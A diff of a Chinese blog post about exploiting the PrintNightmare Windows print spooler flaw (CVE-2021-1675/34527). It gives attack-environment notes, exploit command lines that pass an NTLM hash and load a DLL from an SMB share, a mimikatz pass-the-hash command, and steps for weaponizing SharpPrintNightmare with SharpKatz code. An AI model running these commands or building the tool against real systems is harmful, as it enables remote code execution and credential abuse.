@@ -14,17 +14,17 @@ tags:
 
 **CVE-2021-1675 / CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节**
 
-## 复现攻击环境
+# 复现攻击环境
 
-### 注意事项
+## 注意事项
 
-#### 1.域相关
+### 1.域相关
 
 目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可
 
 > 加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制
 
-#### 2.SMBv1
+### 2.SMBv1
 
 攻击机器为Windows Server 2019及更高版本时，需要执行 `Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol`并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 `Set-SmbServerConfiguration -EnableSMB1Protocol $true`开启SMBv1的支持
 
@@ -113,3 +113,41 @@ CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0
 
 CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f "\\192.168.1.215\share\addCube.dll" "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL"
 ```
+
+# 武器化思路
+
+按照上文的方法已经足够应付大多数攻击场景了，但是如果从武器化开发的角度来看，pyinstaller这东西还是太不优雅了，所以我们回头看向了另一份poc，[SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare)，对这份代码稍作修改即可实现使用hash验证身份的功能
+
+## 1.背景介绍
+
+Pass The Hash这项技术实现起来，有两种思路，一种是自己构造包然后发包完成验证，另一种是修改自己进程或线程内存中保存的身份验证信息并修改。
+
+## 2.确定思路
+
+为了方便开发，这里选用第二种方法。毕竟去翻RPC和SMB的文档是一个很让人头疼的事……
+
+而第二种方法的典型案例就是mimikatz，所以首先使用mimikatz进行简单的测试
+
+```text
+sekurlsa::pth /user:John /domain:192.168.0.111 /ntlm:f0cff78ea8d2d87e5d1caccf01d0bd2f /run:"SharpPrintNightmare.exe"
+
+注：为了方便测试，此处我已经修改SharpPrintNightmare代码，并写死了参数
+```
+
+可以发现思路可行，确定了patch的方案
+
+mimikatz有一个C#的版本[SharpKatz](https://github.com/b4rtik/SharpKatz)，~~抄袭~~参考其中pth功能的实现代码即可
+
+SharpKatz中的此部分代码基本完全由mimikatz的代码翻译而成，建议先看其中任意一个的代码了解下原理。
+
+总结后需要对SharpPrintNightmare进行的修改为：
+
+* 添加pth选项，进行参数判断
+* 修改原项目的Impersonator类，如果使用pth就不再执行LogonUser函数，改为使用SharpKatz中的pth模块的[CreateProcess](https://github.com/b4rtik/SharpKatz/blob/87e8e6661999d19bbcae3c0623f78dc2a1a9b45f/SharpKatz/Module/Pth.cs#L34)函数（此处需要将SharpKatz的对应代码集成进来），注意将impersonate设置为true，以便使用当前线程去连接，而不是使用新进程（方便内存加载）
+* [SharpKatz](https://github.com/b4rtik/SharpKatz)的pth中所需的内存查找的特征不全，需要参考mimikatz中的补全
+
+确定了以上修改方案，再完善一下使用细节，以及对应的文本提示与错误反馈即可完成工具的武器化
+
+## 3.成果
+
+因为各种原因，就不放成品了，有兴趣的可以自己按照步骤修改一遍啦
